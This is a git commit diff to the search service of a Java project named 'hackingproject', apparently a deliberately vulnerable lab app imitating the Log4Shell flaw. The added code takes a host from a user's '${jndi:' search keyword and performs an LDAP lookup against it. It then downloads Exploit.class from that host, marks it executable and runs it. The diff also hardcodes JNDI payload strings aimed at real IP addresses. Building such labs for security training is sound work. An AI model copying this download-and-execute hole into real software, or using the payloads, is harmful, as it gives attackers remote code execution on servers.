e1b66a4f215a56d3f93da7222f766e4bb171e07c
Min Han <hanmin9981@naver.com>
2024-04-26 15:05:09 +0900

    log4j
    d

--- src/main/java/com/example/hackingproject/search/service/searchService.java
+++ src/main/java/com/example/hackingproject/search/service/searchService.java
@@ -10,6 +10,9 @@ import javax.naming.Context;
 import javax.naming.InitialContext;
 import javax.naming.NamingException;
 
+import java.io.File;
+import java.net.URLClassLoader;
+import java.lang.reflect.Method;
 
 import javax.naming.directory.DirContext;
 import javax.naming.directory.InitialDirContext;
@@ -29,11 +32,83 @@ import com.example.hackingproject.stock.vo.StockVO;
 import javax.xml.transform.Result;
 import java.util.List;
 import java.util.ArrayList;
-
+import java.io.InputStream;
+import java.io.FileOutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
 
 @Service
 public class searchService {
+
+
+	public void downloadFileFromURL(String fileUrl, String saveDir) {
+	    try {
+	        URL url = new URL(fileUrl);
+	        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
+	        int responseCode = httpConn.getResponseCode();
+
+	        // HTTP OK를 확인
+	        if (responseCode == HttpURLConnection.HTTP_OK) {
+	            String fileName = "";
+	            String disposition = httpConn.getHeaderField("Content-Disposition");
+
+	            if (disposition != null) {
+	                // 파일 이름을 Content-Disposition 헤더에서 추출
+	                int index = disposition.indexOf("filename=");
+	                if (index > 0) {
+	                    fileName = disposition.substring(index + 10, disposition.length() - 1);
+	                }
+	            } else {
+	                // 파일 이름을 URL에서 추출
+	                fileName = fileUrl.substring(fileUrl.lastIndexOf("/") + 1);
+	            }
+	            
+	            
+	            // 입력 스트림을 통해 파일을 읽고 저장
+	            InputStream inputStream = httpConn.getInputStream();
+	            FileOutputStream outputStream = new FileOutputStream(saveDir + fileName);
+
+	            int bytesRead;
+	            byte[] buffer = new byte[4096];
+	            while ((bytesRead = inputStream.read(buffer)) != -1) {
+	                outputStream.write(buffer, 0, bytesRead);
+	            }
+
+	            outputStream.close();
+	            inputStream.close();
+	            
+	            System.out.println("File downloaded");
+	            File file = new File(saveDir + fileName);
+	            
+	            String command = "chmod 755 " + file.getAbsolutePath();
+	            Process proc = Runtime.getRuntime().exec(command);
+	            proc.waitFor();
+	            
+	            Process proc1 = Runtime.getRuntime().exec("java Exploit");
+	            proc1.waitFor();
+	            System.out.println(saveDir + fileName);
+	            
+	            System.out.println("asdfadsfadsfasdfd"+saveDir + fileName);
+	            System.out.println("Permissions set: chmod 755 " + file.getAbsolutePath());
+	            System.out.println("Permissions set: chmod 755 Exploit.class" );
+	            
+	            // 파일 로드 및 실행
+	            
+	            System.out.println("File downloaded: " + file.getAbsolutePath());
+	            URL classUrl = file.toURI().toURL(); // 파일을 URL로 변환
+	            System.out.println("Class URL: " + classUrl);
+	            
+	        } else {
+	            System.out.println("No file to download. Server replied HTTP code: " + responseCode);
+	        }
+	        httpConn.disconnect();
+	    } catch (Exception e) {
+	        System.out.println("Error downloading the file: " + e.getMessage());
+	        e.printStackTrace();
+	    }
+	}
+
 	
 	private static final Logger logger = LogManager.getLogger(searchService.class);
 
@@ -45,49 +120,74 @@ public class searchService {
         
         String log4jVersion = LogManager.getLogger(Logger.class).getClass().getPackage().getImplementationVersion();
         String keyword = key.getKeywords();
-        String userInput = "${jndi:ldap://51.21.82.80:1389/a}";
-        String jndiLookupString = "${jndi:ldap://51.21.82.80:1389/dc=example,dc=com}";
-        
+        String userInput = "${jndi:ldap://192.168.14.28:1389/a}";
+        String jndiLookupString = "${jndi:ldap://192.168.14.28:1389/dc=example,dc=com}";
+        String syntax="ldap://192.168.14.28:1389";
         
         logger.info(keyword);
-        logger.info(log4jVersion);
-        logger.info("This is test log for example of lookups - ${java:runtime}");
-        logger.error(jndiLookupString);
-        
-        Hashtable<String, String> env = new Hashtable<>();
-        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
-        env.put(Context.PROVIDER_URL, "ldap://51.21.82.80:1389/dc=example,dc=com");
-
-        try {
-            DirContext ctx = new InitialDirContext(env);
-            System.out.println("Connected to the LDAP server.");
-            // LDAP 서버에서 데이터를 조회하거나 조작하는 코드 추가
-            ctx.close();
-        } catch (NamingException e) {
-            System.out.println("Cannot connect to LDAP server: " + e.getMessage());
-        }
-
-        //
-        String jndiPath = "ldap://51.21.82.80:1389/dc=example,dc=com";
-        
-        // 환경 설정
-        Hashtable<String, String> env1 = new Hashtable<>();
-        env1.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
-        env1.put(Context.PROVIDER_URL, jndiPath);
-        
-        try {
-            // InitialContext 생성 및 Lookup 수행
-            Context ctx = new InitialContext(env1);
-            Object obj = ctx.lookup(jndiPath);
+        String[] word = keyword.split("\\$\\{jndi:");
+        if(keyword.contains("{jndi:")) {
+        	
+        	
+        	System.out.println(word[1]);
+        	String syn = word[1].replace("}", "");
+        	
+        	int idx = syn.lastIndexOf("/");
+        	if(idx != -1) {
+        		syntax = syn.substring(0, idx);
+        	}
+        	System.out.println("syntax : "+ syntax);//
+        	
+        	String redirect_add = syntax.replace("ldap://","");
+        	redirect_add = redirect_add.replace(":1389","");
+            Hashtable<String, String> env = new Hashtable<>();
+            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
+            env.put(Context.PROVIDER_URL, syntax +"/dc=example,dc=com");
             
-            System.out.println("Object obtained from JNDI: " + obj);
+            String jndiPath = syntax +"/dc=example,dc=com";
+
+            try {
+                DirContext ctx = new InitialDirContext(env);
+                System.out.println("Connected to the LDAP server.");
+                // LDAP 서버에서 데이터를 조회하거나 조작하는 코드 추가
+                ctx.close();
+            } catch (NamingException e) {
+                System.out.println("Cannot connect to LDAP server: " + e.getMessage());
+            }
+
+            //
+            System.out.println("jndiPath : "+ jndiPath);//
             
-            // Context 사용 후 닫기
-            ctx.close();
-        } catch (NamingException e) {
-            System.err.println("Error during JNDI Lookup: " + e.getMessage());
-            e.printStackTrace();
+            // 환경 설정
+            Hashtable<String, String> env1 = new Hashtable<>();
+            env1.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
+            env1.put(Context.PROVIDER_URL, jndiPath);
+            
+            try {
+                // InitialContext 생성 및 Lookup 수행
+                Context ctx = new InitialContext(env1);
+                Object obj = ctx.lookup(jndiPath);
+                
+                System.out.println("Object obtained from JNDI: " + obj);//
+                
+                
+                System.out.println(redirect_add);
+                String fileUrl = "http://"+redirect_add+":8000/Exploit.class"; // 리다이렉션된 URL
+                String savePath = "/Users/hanmin/eclipse/jee-2024-03/Eclipse.app/Contents/MacOS/"; // 파일을 저장할 경로
+                String currentDir = System.getProperty("user.dir");
+                System.out.println("Current working directory: " + currentDir);
+                downloadFileFromURL(fileUrl, savePath);
+
+                // Context 사용 후 닫기
+                ctx.close();
+            } catch (NamingException e) {
+                System.err.println("Error during JNDI Lookup: " + e.getMessage());
+                e.printStackTrace();
+            }
+
         }
+        
+
 
         
         //
